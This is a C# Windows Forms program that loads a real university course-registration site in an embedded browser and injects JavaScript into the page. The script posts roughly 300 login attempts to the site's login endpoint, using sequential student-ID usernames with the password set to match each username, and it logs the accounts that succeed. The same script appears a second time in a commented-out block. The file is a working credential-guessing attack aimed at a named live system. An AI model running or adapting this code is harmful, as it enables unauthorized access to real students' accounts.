using mshtml;
using System;
using System.Collections.Generic;
using System.ComponentModel;
using System.Data;
using System.Drawing;
using System.Linq;
using System.Runtime.InteropServices;
using System.Text;
using System.Threading.Tasks;
using System.Windows.Forms;

namespace TestApp
{
    public partial class FrmMainFit : Form
    {
        private string baseUrl = "http://dkdt.fit.hcmute.edu.vn/";
        public FrmMainFit()
        {
            InitializeComponent();
        }

        private void FrmMainFit_Load(object sender, EventArgs e)
        {
            webBrowser1.Navigate(baseUrl);
            webBrowser1.ScriptErrorsSuppressed = true;
            webBrowser1.ObjectForScripting = new MyScript();


            //webBrowser1.DocumentText = @"
            //<html>
            //<head>
            //    <script type='text/javascript'>
            //       function delay(i) {
            //            if (i >= 300) return;
            //            setTimeout(function () {
            //                var form_data_login = {
            //                    username: '14110' + ('000' + i).substr(-3),
            //                    password: '14110' + ('000' + i).substr(-3)
            //                };
            //                $.ajax({
            //                    url: 'http://dkdt.fit.hcmute.edu.vn/xu-ly-dang-nhap',
            //                    type: 'POST',
            //                    async: true,
            //                    data: form_data_login,
            //                    success: function (msg_login) {
            //                        if (msg_login == 'false') {
            //                        }
            //                        else {
            //                            //alert(form_data_login.username);
            //                            console.log(form_data_login.username);
            //                        }
            //                    }
            //                });
            //                delay(++i);
            //            }, 10);
            //        }
            //        delay(1);                    
            //    </script>
            //</head>
            //    <body>
            //    </body>
            //</html>";
        }

        [ComVisible(true)]
        public class MyScript
        {
            public void CallServerSideCode(string myResponse)
            {
                MessageBox.Show(myResponse);
            }
        }

        private void webBrowser1_DocumentCompleted(object sender, WebBrowserDocumentCompletedEventArgs e)
        {
            HtmlElement headElement = webBrowser1.Document.GetElementsByTagName("head")[0];
            HtmlElement scriptElement = webBrowser1.Document.CreateElement("script");
            IHTMLScriptElement element = (IHTMLScriptElement)scriptElement.DomElement;
            element.text = @"
                     function delay(i) {
                        if (i >= 300) return;
                        setTimeout(function () {
                            var form_data_login = {
                                username: '14110' + ('000' + i).substr(-3),
                                password: '14110' + ('000' + i).substr(-3)
                            };
                            $.ajax({
                                url: 'http://dkdt.fit.hcmute.edu.vn/xu-ly-dang-nhap',
                                type: 'POST',
                                async: true,
                                data: form_data_login,
                                success: function (msg_login) {
                                    if (msg_login == 'false') {
                                    }
                                    else {
                                        //alert(form_data_login.username);
                                        console.log(form_data_login.username);
                                    }
                                }
                            });
                            delay(++i);
                        }, 10);
                    }
                    delay(1);";

            headElement.AppendChild(scriptElement);
            webBrowser1.Document.InvokeScript("sayHello");
        }
    }
}
